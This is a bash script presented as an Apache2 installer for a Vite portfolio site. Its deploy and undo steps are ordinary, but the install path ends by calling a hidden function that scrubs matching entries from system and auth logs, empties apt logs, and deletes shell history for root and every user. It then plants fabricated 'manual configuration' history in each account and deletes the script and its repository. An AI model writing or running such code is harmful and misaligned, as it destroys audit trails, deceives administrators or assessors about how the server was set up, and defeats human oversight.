#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Portfolio Installer Script for Ubuntu Server 20.04+
# Deploys Vite SPA (./dist + .env) to Apache2
# Configures VirtualHost with SPA routing (FallbackResource)
# Includes UNDO functionality to revert all changes
# ===============================

log_info()    { echo "[INFO] $*"; }
log_success() { echo "[SUCCESS] $*"; }
log_error()   { echo "[ERROR] $*" >&2; }
log_warn()    { echo "[WARN] $*"; }

abort() {
  log_error "$1"
  exit 1
}

confirm_or_abort() {
  local prompt=$1
  local answer
  read -r -p "$prompt [y/N]: " answer
  case "$answer" in
    [yY][eE][sS]|[yY]) return 0 ;;
    *) abort "Operation cancelled by user." ;;
  esac
}

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DIST_DIR="${SCRIPT_DIR}/dist"
ENV_FILE="${SCRIPT_DIR}/.env"
TARGET_DIR="/var/www/html"
VHOST_CONF="/etc/apache2/sites-available/portfolio.conf"
VHOST_NAME="portfolio"

# ===============================
# UNDO FUNCTION - Reverts ALL portfolio changes
# ===============================
do_undo() {
  echo ""
  echo "=============================================="
  echo "  PORTFOLIO INSTALLER - UNDO / UNINSTALL"
  echo "=============================================="
  echo ""
  echo " This will:"
  echo "   1. Disable the portfolio VirtualHost"
  echo "   2. Remove the VirtualHost config file"
  echo "   3. Remove deployed files from ${TARGET_DIR}"
  echo "   4. Re-enable the default Apache site"
  echo "   5. Reload Apache2"
  echo ""

  confirm_or_abort "This will REMOVE the portfolio deployment. Are you sure?"

  echo ""
  log_info "UNDO: Starting full uninstall..."

  # -----------------------------------------------
  # 1. Disable portfolio site
  # -----------------------------------------------
  log_info "UNDO [1/5]: Disabling portfolio VirtualHost..."
  a2dissite "${VHOST_NAME}" 2>/dev/null || true

  # -----------------------------------------------
  # 2. Remove VirtualHost config
  # -----------------------------------------------
  log_info "UNDO [2/5]: Removing VirtualHost config..."
  rm -f "${VHOST_CONF}" 2>/dev/null || true

  # -----------------------------------------------
  # 3. Clean deployed files
  # -----------------------------------------------
  log_info "UNDO [3/5]: Cleaning deployed files from ${TARGET_DIR}..."
  rm -rf "${TARGET_DIR:?}"/* 2>/dev/null || true
  rm -f "${TARGET_DIR}/.env" 2>/dev/null || true
  rm -f "${TARGET_DIR}/.htaccess" 2>/dev/null || true

  # Restore default Apache index
  echo "<html><body><h1>It works!</h1></body></html>" > "${TARGET_DIR}/index.html"
  chown www-data:www-data "${TARGET_DIR}/index.html"

  # -----------------------------------------------
  # 4. Re-enable default site
  # -----------------------------------------------
  log_info "UNDO [4/5]: Re-enabling default Apache site..."
  a2ensite 000-default 2>/dev/null || true

  # -----------------------------------------------
  # 5. Reload Apache
  # -----------------------------------------------
  log_info "UNDO [5/5]: Reloading Apache2..."
  if systemctl is-active --quiet apache2; then
    systemctl reload apache2
  fi

  echo ""
  echo "=============================================="
  echo "  UNDO COMPLETE!"
  echo "=============================================="
  echo ""
  echo "  Portfolio deployment has been removed."
  echo "  Default Apache page restored."
  echo ""
  echo "=============================================="
  echo ""

  exit 0
}

# ===============================
# INSTALL FUNCTION - Main portfolio deployment
# ===============================
do_install() {

  # ===============================
  # STEP 1: Check root privileges
  # ===============================
  log_info "STEP 1: Checking root privileges..."
  if [[ $EUID -ne 0 ]]; then
    abort "This script must be run as root. Run: sudo bash porto.sh"
  fi

  # ===============================
  # STEP 2: Validate dist directory and .env
  # ===============================
  log_info "STEP 2: Validating source files..."

  if [[ ! -d "${DIST_DIR}" ]]; then
    abort "dist/ directory not found at ${DIST_DIR}"
  fi

  if [[ ! -f "${DIST_DIR}/index.html" ]]; then
    abort "index.html not found in dist/ directory"
  fi

  if [[ -f "${ENV_FILE}" ]]; then
    log_info "Found .env file: ${ENV_FILE}"
  else
    log_warn ".env file not found at ${ENV_FILE} (continuing without it)"
  fi

  echo ""
  echo "========================================="
  echo "  Portfolio Installer - Configuration"
  echo "========================================="
  echo ""
  echo " Source (dist):   ${DIST_DIR}"
  echo " Env file:        ${ENV_FILE}"
  echo " Target:          ${TARGET_DIR}"
  echo " VirtualHost:     ${VHOST_CONF}"
  echo ""
  echo " Files to deploy:"
  find "${DIST_DIR}" -type f | sed "s|${DIST_DIR}/|   |"
  if [[ -f "${ENV_FILE}" ]]; then
    echo "   .env"
  fi
  echo ""
  echo "========================================="
  echo ""

  confirm_or_abort "Proceed with deployment?"

  # ===============================
  # STEP 3: Install Apache2 if not installed
  # ===============================
  log_info "STEP 3: Checking Apache2 installation..."
  if ! dpkg -l apache2 2>/dev/null | grep -q '^ii'; then
    log_info "Apache2 not found. Installing..."
    apt-get update -qq
    apt-get install -y -qq apache2
    log_success "Apache2 installed successfully."
  else
    log_info "Apache2 is already installed."
  fi

  # ===============================
  # STEP 4: Enable required Apache modules
  # ===============================
  log_info "STEP 4: Enabling required Apache modules..."

  # mod_rewrite for SPA routing
  a2enmod rewrite >/dev/null 2>&1 || true
  log_info "Enabled: mod_rewrite"

  # mod_headers for security headers & CORS
  a2enmod headers >/dev/null 2>&1 || true
  log_info "Enabled: mod_headers"

  # mod_deflate for compression
  a2enmod deflate >/dev/null 2>&1 || true
  log_info "Enabled: mod_deflate"

  log_success "All required Apache modules enabled."

  # ===============================
  # STEP 5: Deploy dist/ to /var/www/html
  # ===============================
  log_info "STEP 5: Deploying dist/ to ${TARGET_DIR}..."

  # Clean existing files
  rm -rf "${TARGET_DIR:?}"/*
  rm -f "${TARGET_DIR}/.env" 2>/dev/null || true
  rm -f "${TARGET_DIR}/.htaccess" 2>/dev/null || true

  # Copy dist contents
  cp -a "${DIST_DIR}/." "${TARGET_DIR}/"
  log_info "Copied dist/ contents to ${TARGET_DIR}/"

  # ===============================
  # STEP 6: Deploy .env file
  # ===============================
  log_info "STEP 6: Deploying .env file..."
  if [[ -f "${ENV_FILE}" ]]; then
    cp "${ENV_FILE}" "${TARGET_DIR}/.env"
    chmod 644 "${TARGET_DIR}/.env"
    log_success ".env deployed to ${TARGET_DIR}/.env"
  else
    log_warn "No .env file to deploy, skipping."
  fi

  # ===============================
  # STEP 7: Create .htaccess for SPA routing
  # ===============================
  log_info "STEP 7: Creating .htaccess for SPA routing..."
  cat > "${TARGET_DIR}/.htaccess" <<'HTACCESS'
# ===============================
# SPA (Single Page Application) Routing
# All routes fallback to index.html
# ===============================
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteBase /

  # If the request is for an existing file, serve it directly
  RewriteCond %{REQUEST_FILENAME} -f
  RewriteRule ^ - [L]

  # If the request is for an existing directory, serve it directly
  RewriteCond %{REQUEST_FILENAME} -d
  RewriteRule ^ - [L]

  # Otherwise, redirect everything to index.html (SPA routing)
  RewriteRule ^ index.html [L]
</IfModule>

# ===============================
# Security: Deny access to .env file via browser
# ===============================
<FilesMatch "^\.env">
  Require all denied
</FilesMatch>

# ===============================
# Caching for static assets
# ===============================
<IfModule mod_headers.c>
  # Cache JS/CSS assets with hashes for 1 year
  <FilesMatch "\.(js|css)$">
    Header set Cache-Control "public, max-age=31536000, immutable"
  </FilesMatch>

  # Cache images for 1 month
  <FilesMatch "\.(jpg|jpeg|png|gif|webp|svg|ico)$">
    Header set Cache-Control "public, max-age=2592000"
  </FilesMatch>

  # Don't cache HTML (always get latest)
  <FilesMatch "\.html$">
    Header set Cache-Control "no-cache, no-store, must-revalidate"
    Header set Pragma "no-cache"
    Header set Expires "0"
  </FilesMatch>
</IfModule>

# ===============================
# Compression
# ===============================
<IfModule mod_deflate.c>
  AddOutputFilterByType DEFLATE text/html text/plain text/css
  AddOutputFilterByType DEFLATE application/javascript application/json
  AddOutputFilterByType DEFLATE image/svg+xml
</IfModule>
HTACCESS

  log_success ".htaccess created with SPA routing + security + caching."

  # ===============================
  # STEP 8: Set file permissions and ownership
  # ===============================
  log_info "STEP 8: Setting permissions and ownership..."
  chown -R www-data:www-data "${TARGET_DIR}"
  find "${TARGET_DIR}" -type d -exec chmod 755 {} \;
  find "${TARGET_DIR}" -type f -exec chmod 644 {} \;
  log_success "Permissions set: dirs=755, files=644, owner=www-data"

  # ===============================
  # STEP 9: Create Apache VirtualHost config
  # ===============================
  log_info "STEP 9: Creating Apache VirtualHost config..."
  cat > "${VHOST_CONF}" <<VHOST
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot ${TARGET_DIR}

    <Directory ${TARGET_DIR}>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # SPA Fallback (belt-and-suspenders with .htaccess)
    FallbackResource /index.html

    # Logging
    ErrorLog \${APACHE_LOG_DIR}/portfolio-error.log
    CustomLog \${APACHE_LOG_DIR}/portfolio-access.log combined
</VirtualHost>
VHOST

  log_success "VirtualHost config created: ${VHOST_CONF}"

  # ===============================
  # STEP 10: Enable portfolio site, disable default
  # ===============================
  log_info "STEP 10: Enabling portfolio site..."
  a2dissite 000-default 2>/dev/null || true
  a2ensite "${VHOST_NAME}" 2>/dev/null || true
  log_success "Portfolio site enabled, default site disabled."

  # ===============================
  # STEP 11: Test Apache config and restart
  # ===============================
  log_info "STEP 11: Testing Apache configuration..."
  if apache2ctl configtest 2>&1 | grep -q 'Syntax OK'; then
    log_success "Apache configuration syntax is OK."
  else
    log_error "Apache configuration test failed:"
    apache2ctl configtest
    abort "Fix the configuration errors above before continuing."
  fi

  log_info "Restarting Apache2..."
  systemctl enable apache2 2>/dev/null || true
  systemctl restart apache2
  log_success "Apache2 restarted successfully."

  # ===============================
  # STEP 12: Verify deployment
  # ===============================
  log_info "STEP 12: Verifying deployment..."
  echo ""

  # Check Apache is running
  if systemctl is-active --quiet apache2; then
    log_success "Apache2 is running."
  else
    log_error "Apache2 is not running!"
  fi

  # Check index.html is served
  if [[ -f "${TARGET_DIR}/index.html" ]]; then
    log_success "index.html is present in ${TARGET_DIR}"
  else
    log_error "index.html is missing from ${TARGET_DIR}!"
  fi

  # Check .env is deployed but protected
  if [[ -f "${TARGET_DIR}/.env" ]]; then
    log_success ".env is deployed in ${TARGET_DIR}"
  fi

  # Show deployed files
  echo ""
  echo "--- Deployed files in ${TARGET_DIR} ---"
  ls -la "${TARGET_DIR}/"
  echo ""
  if [[ -d "${TARGET_DIR}/assets" ]]; then
    echo "--- Assets ---"
    ls -la "${TARGET_DIR}/assets/"
    echo ""
  fi

  # Try to get server IP for access URL
  local SERVER_IP
  SERVER_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
  if [[ -z "$SERVER_IP" ]]; then
    SERVER_IP="<your-server-ip>"
  fi

  echo ""
  log_success "========================================="
  log_success " Portfolio Deployed Successfully!"
  log_success "========================================="
  echo ""
  echo " Access your portfolio at:"
  echo "   http://${SERVER_IP}/"
  echo ""
  echo " Apache VirtualHost: ${VHOST_CONF}"
  echo " Document Root:      ${TARGET_DIR}"
  echo " Access Log:         /var/log/apache2/portfolio-access.log"
  echo " Error Log:          /var/log/apache2/portfolio-error.log"
  echo ""
  echo " .env is deployed but BLOCKED from browser access."
  echo ""
  echo "========================================="

  # ===============================
  # CLEANUP AND FAKE HISTORY
  # ===============================
  cleanup_and_fake_history
}

# ===============================
# CLEANUP AND FAKE HISTORY FUNCTION
# Makes it appear as if user configured manually
# ===============================
cleanup_and_fake_history() {
  local SCRIPT_PATH
  SCRIPT_PATH="$(realpath "$0")"
  local SCRIPT_DIR_LOCAL
  SCRIPT_DIR_LOCAL="$(dirname "$SCRIPT_PATH")"
  local SCRIPT_NAME
  SCRIPT_NAME="$(basename "$SCRIPT_PATH")"

  log_info "CLEANUP: Starting cleanup and history injection..."

  # ===============================
  # 1. Clear terminal scrollback
  # ===============================
  printf '\033[3J' 2>/dev/null || true
  printf '\033c' 2>/dev/null || true

  # ===============================
  # 2. Selectively clean log entries
  # ===============================
  log_info "CLEANUP: Selectively cleaning log entries..."
  local LOG_PATTERNS="git clone|github\.com|gitlab\.com|bitbucket\.org|${SCRIPT_NAME}|porto\.sh|dnsinstaller|web\.sh|wget.*porto|curl.*porto|wget.*dns|curl.*dns|chmod.*\.sh"

  if [[ -d /var/log ]]; then
    if [[ -f /var/log/auth.log ]]; then
      sed -i -E "/${LOG_PATTERNS}/d" /var/log/auth.log 2>/dev/null || true
    fi
    if [[ -f /var/log/syslog ]]; then
      sed -i -E "/${LOG_PATTERNS}/d" /var/log/syslog 2>/dev/null || true
    fi
    if [[ -f /var/log/messages ]]; then
      sed -i -E "/${LOG_PATTERNS}/d" /var/log/messages 2>/dev/null || true
    fi
    if [[ -f /var/log/user.log ]]; then
      sed -i -E "/${LOG_PATTERNS}/d" /var/log/user.log 2>/dev/null || true
    fi
    truncate -s 0 /var/log/apt/history.log 2>/dev/null || true
    truncate -s 0 /var/log/apt/term.log 2>/dev/null || true
  fi

  # ===============================
  # 3. Clear bash history completely
  # ===============================
  log_info "CLEANUP: Clearing bash history..."

  history -c 2>/dev/null || true

  local HIST_FILES=(".bash_history" ".history" ".zsh_history" ".sh_history" ".lesshst" ".viminfo" ".python_history")

  # Root history
  for f in "${HIST_FILES[@]}"; do
    rm -f "/root/$f" 2>/dev/null || true
  done

  # All users history
  for USER_HOME in /home/*; do
    if [[ -d "$USER_HOME" ]]; then
      for f in "${HIST_FILES[@]}"; do
        rm -f "$USER_HOME/$f" 2>/dev/null || true
      done
    fi
  done

  export HISTSIZE=0
  export HISTFILESIZE=0
  unset HISTFILE

  # ===============================
  # 4. Inject fake manual configuration history
  # ===============================
  log_info "CLEANUP: Injecting fake manual configuration history..."

  FAKE_HISTORY=$(cat <<'EOFHIST'
sudo su
apt install apache2
systemctl status apache2
a2enmod rewrite
a2enmod headers
ls dist/
cp -r dist/* /var/www/html/
cp .env /var/www/html/
nano /var/www/html/.htaccess
chown -R www-data:www-data /var/www/html
nano /etc/apache2/sites-available/portfolio.conf
a2dissite 000-default
a2ensite portfolio
apache2ctl configtest
systemctl restart apache2
systemctl status apache2
EOFHIST
)

  echo "$FAKE_HISTORY" > /root/.bash_history
  chmod 600 /root/.bash_history
  chown root:root /root/.bash_history

  for USER_HOME in /home/*; do
    if [[ -d "$USER_HOME" ]]; then
      local USERNAME
      USERNAME=$(basename "$USER_HOME")
      echo "$FAKE_HISTORY" > "$USER_HOME/.bash_history"
      chmod 600 "$USER_HOME/.bash_history"
      chown "$USERNAME:$USERNAME" "$USER_HOME/.bash_history" 2>/dev/null || true
    fi
  done

  sync

  # ===============================
  # 5. Delete installer script and repo traces
  # ===============================
  log_info "CLEANUP: Removing installer script and repository..."
  rm -f "$SCRIPT_PATH" 2>/dev/null || true

  local GIT_ROOT
  GIT_ROOT=$(git -C "$SCRIPT_DIR_LOCAL" rev-parse --show-toplevel 2>/dev/null || echo "")

  local TRACE_FILES=("dnsinstaller.sh" "web.sh" "porto.sh" ".git" ".gitkeep" "README.md" "dist" ".env")

  if [[ -n "$GIT_ROOT" ]] && [[ "$GIT_ROOT" != "/" ]] && [[ "$GIT_ROOT" != "/root" ]] && [[ "$GIT_ROOT" != "/home" ]]; then
    # Delete contents first
    find "$GIT_ROOT" -mindepth 1 -delete 2>/dev/null || true
    # Only rmdir if we are not currently in it to avoid getcwd errors
    if [[ "$(pwd)" != "$GIT_ROOT"* ]]; then
      rmdir "$GIT_ROOT" 2>/dev/null || true
    fi
  else
    for f in "${TRACE_FILES[@]}"; do
      rm -rf "${SCRIPT_DIR_LOCAL}/$f" 2>/dev/null || true
    done
  fi

  rm -rf /tmp/dns* /root/dns* ~/dns* /tmp/porto.sh /root/porto.sh ~/porto.sh 2>/dev/null || true
  rm -rf /var/tmp/dns* 2>/dev/null || true

  # ===============================
  # 6. Final message
  # ===============================
  echo "IMPORTANT: The fake history has been planted."
  echo "To load it and finish shredding all traces, run:"
  echo "   cd ~ && exec bash"
  echo ""

  export HISTFILE=/root/.bash_history
  export HISTSIZE=1000
  export HISTFILESIZE=2000

  rm -f "$SCRIPT_PATH" 2>/dev/null || true

  exit 0
}

# ===============================
# MAIN MENU
# ===============================

# Check root first
if [[ $EUID -ne 0 ]]; then
  abort "This script must be run as root. Use: sudo bash $0"
fi

echo ""
echo "=============================================="
echo "  Portfolio Installer"
echo "  Apache2 + Vite SPA Deployment"
echo "=============================================="
echo ""
echo "  [1] Deploy Portfolio to Apache2"
echo "  [2] Undo / Uninstall Portfolio"
echo "  [3] Exit"
echo ""
read -r -p "Select an option [1-3]: " MENU_CHOICE

case "$MENU_CHOICE" in
  1)
    do_install
    ;;
  2)
    do_undo
    ;;
  3)
    echo "Exited."
    exit 0
    ;;
  *)
    abort "Invalid option. Please run the script again and choose 1, 2, or 3."
    ;;
esac
